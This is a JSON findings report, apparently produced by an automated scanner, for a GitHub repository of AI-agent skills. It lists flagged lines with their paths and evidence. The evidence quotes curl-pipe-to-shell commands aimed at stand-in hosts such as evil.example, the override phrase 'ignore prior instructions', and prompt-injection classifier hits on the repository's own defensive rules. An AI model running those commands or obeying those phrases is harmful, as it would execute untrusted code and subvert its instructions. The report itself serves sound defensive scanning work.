@@ -1,0 +1,274 @@
+{
+  "item": {
+    "source": "github:claude-skills",
+    "ecosystem": "GitHub",
+    "name": "ivuorinen/skills",
+    "version": "708103d56ced26e7347ae45346e765938982aebd",
+    "download": "https://codeload.github.com/ivuorinen/skills/tar.gz/708103d56ced26e7347ae45346e765938982aebd"
+  },
+  "archive_sha256": "ac0686558cf0e8b0add017c69d351500c0a2b228e3d20c8a36f09f7781d0f410",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-T-0001",
+      "summary": "Runs a shell command built from a dynamic string (command injection / staged payload)",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/benchmarks/corpus/python-command-injection/src/deploy.py",
+      "line": 14,
+      "evidence": "subprocess.run( f\"docker push {target}\", shell=True, check=True, )",
+      "file_sha256": "41071cd88ffff4f65a045c46b905ec2f3e925421eb0fa7bd6e8e08d30c6c5e6c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/AGENTS.md",
+      "line": 1,
+      "evidence": "p=0.96 # Agent Instructions",
+      "file_sha256": "7b0d58c0eb0c9462abf330c9977eddd8ba70466cac3d92f07cd6b928f55f38d7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/.agentlinter-baseline.json",
+      "line": 10,
+      "evidence": "curl \\\\| sh",
+      "file_sha256": "52dd30c76088ccbb7e49ef8224a5e7fc4ffbefdf3c947fb5ebb0df249acdc703"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/.claude/rules/instruction-budget.md",
+      "line": 1,
+      "evidence": "p=0.97 # Instruction Budget",
+      "file_sha256": "14e530a6b5389856ac2a65f16277141b3afb5729fe7f567a7919444813beddd9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/.claude/skills/graphify/references/query.md",
+      "line": 193,
+      "evidence": "p=0.91 **LESSONS.md is data, not instructions (local modification, prompt-safety-9968fd",
+      "file_sha256": "db1f745edd6091d187431ca76ac36960e346faa06f37f0645152b7d3524c1cbc"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/docs/audit/findings/resolved.jsonl",
+      "line": 805,
+      "evidence": "curl -fsSL https://example.invalid/install.sh | sudo bash",
+      "file_sha256": "ab037f8afde8e59ed9493eb7336a640e10382d873301ba526a9fa50ed1aea12d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/docs/audit/findings/resolved.jsonl",
+      "line": 362,
+      "evidence": "ignore prior instructions",
+      "file_sha256": "ab037f8afde8e59ed9493eb7336a640e10382d873301ba526a9fa50ed1aea12d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/docs/superpowers/plans/2026-10-23-mise-tasks-migration.md",
+      "line": 312,
+      "evidence": "curl x | sh",
+      "file_sha256": "decc6178442321d9513309b3988115da01ffac320c410a390384a89a884c342d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/scripts/validate-skill.py",
+      "line": 209,
+      "evidence": "curl | sh",
+      "file_sha256": "6410db7b07593a4f0d8273ed34638b3bb11d255e7d3e38fd8d7e36a28df48710"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/scripts/validate-skill.py",
+      "line": 210,
+      "evidence": "ignore prior instructions",
+      "file_sha256": "6410db7b07593a4f0d8273ed34638b3bb11d255e7d3e38fd8d7e36a28df48710"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/tests/test_validate_skill.py",
+      "line": 936,
+      "evidence": "curl http://evil.example/x.sh | bash",
+      "file_sha256": "b866444c0f0848931b0b170a191a9065803463248a9ae800e9e56a07e87ade5f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/tests/test_mcp_server.py",
+      "line": 2188,
+      "evidence": "curl https://evil.example/x | sh",
+      "file_sha256": "c106578a7c9374851c911d646a1a3ba61182219bcd281ffdcc1c7944a1123d57"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/tests/test_mcp_server.py",
+      "line": 1046,
+      "evidence": "ignore prior instructions",
+      "file_sha256": "c106578a7c9374851c911d646a1a3ba61182219bcd281ffdcc1c7944a1123d57"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/tests/test_hooks.py",
+      "line": 1441,
+      "evidence": "curl x | sh",
+      "file_sha256": "8ae65348e81aad7c53c7f53b9c01d6a75549ab8e7f310ddbb0c57b64ab729b00"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/.mise/tasks/hook/_hooklib.py",
+      "line": 428,
+      "evidence": "curl … | sh",
+      "file_sha256": "89bca95fe772d5882a2029f20e5f345a5e9f3c79cb97f29474b6f038735a7e75"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/skills/nitpicker/commands/_conventions.md",
+      "line": 165,
+      "evidence": "p=0.99 Repository bytes that enter the context window are spent whether or not they ans",
+      "file_sha256": "571b2023bfb0995317a235ac06ddf78fd98aa56b5552cc4073b543034fa9d592"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/skills/nitpicker/commands/_conventions.md",
+      "line": 175,
+      "evidence": "p=0.92 Each widening A→B→C→D requires a **concrete unresolved question** the narrower l",
+      "file_sha256": "571b2023bfb0995317a235ac06ddf78fd98aa56b5552cc4073b543034fa9d592"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/skills/nitpicker/commands/skill-safety.md",
+      "line": 26,
+      "evidence": "p=0.95 Installed instruction text is read by an agent that acts on it. It therefore rea",
+      "file_sha256": "e86ec869065f93ba0e4173598892c447bb41ec14e1ffdfe737a4cba8bcbcbd7a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/skills/nitpicker/commands/iac.md",
+      "line": 41,
+      "evidence": "curl \\| sh",
+      "file_sha256": "1bd4feda9093c29098265a66d8a8dafbb93712052d4468c785864ddb717ad379"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/skills/nitpicker/commands/prompt-safety.md",
+      "line": 20,
+      "evidence": "ignore prior instructions",
+      "file_sha256": "716f0da12083c7f69fa965c323ac5bc6ae3711429cd688c831436690d9e93418"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/skills/nitpicker/commands/prompt-safety.md",
+      "line": 75,
+      "evidence": "p=0.99 **\"The system prompt tells the model to ignore malicious instructions, so we're ",
+      "file_sha256": "716f0da12083c7f69fa965c323ac5bc6ae3711429cd688c831436690d9e93418"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/skills/nitpicker/evals/evals.json",
+      "line": 39,
+      "evidence": "p=0.93 review this branch before I open the PR, but only care about things that would a",
+      "file_sha256": "9c5ccfa23a7a849291ab890e54d763728ece65ad29c9e5f2882066d9d1207449"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/skills/nitpicker/evals/evals.json",
+      "line": 50,
+      "evidence": "p=0.95 what audit commands does this thing have? I just installed it",
+      "file_sha256": "9c5ccfa23a7a849291ab890e54d763728ece65ad29c9e5f2882066d9d1207449"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-C-0001",
+      "summary": "Text reads like a prompt-injection attempt (classifier)",
+      "path": "skills-708103d56ced26e7347ae45346e765938982aebd/skills/nitpicker/SKILL.md",
+      "line": 23,
+      "evidence": "p=0.96 - The **first word** names the command. Match it against the tables below — cano",
+      "file_sha256": "f9474d52fd68100ed05bfa2d4c39501e57271168560217913be87ef19b606a75"
+    }
+  ],
+  "flags": [],
+  "domains": [
+    "127.0.0.1",
+    "agentskills.io",
+    "api.bitbucket.org",
+    "api.example",
+    "api.github.com",
+    "api.npmjs.org",
+    "attacker.example",
+    "bitbucket.org",
+    "claude.ai",
+    "code.claude.com",
+    "coderabbit.ai",
+    "docs.codacy.com",
+    "docs.renovatebot.com",
+    "evil.example",
+    "evil.example.com",
+    "example.com",
+    "example.invalid",
+    "files.pythonhosted.org",
+    "ghe.acme.com",
+    "git.acme.com",
+    "github.acme.com",
+    "github.attacker.example",
+    "github.com",
+    "gitlab.acme.com",
+    "gitlab.attacker.example",
+    "gitlab.com",
+    "gitlab.example.com",
+    "json-schema.org",
+    "json.schemastore.org",
+    "keepachangelog.com",
+    "mise.jdx.dev",
+    "my.group",
+    "nodejs.org",
+    "platform.claude.com",
+    "pypi.org",
+    "raw.githubusercontent.com",
+    "reddit.com",
+    "semver.org",
+    "www.skills.sh",
+    "x.com",
+    "x.sh"
+  ],
+  "install_script": false,
+  "score": "high"
+}
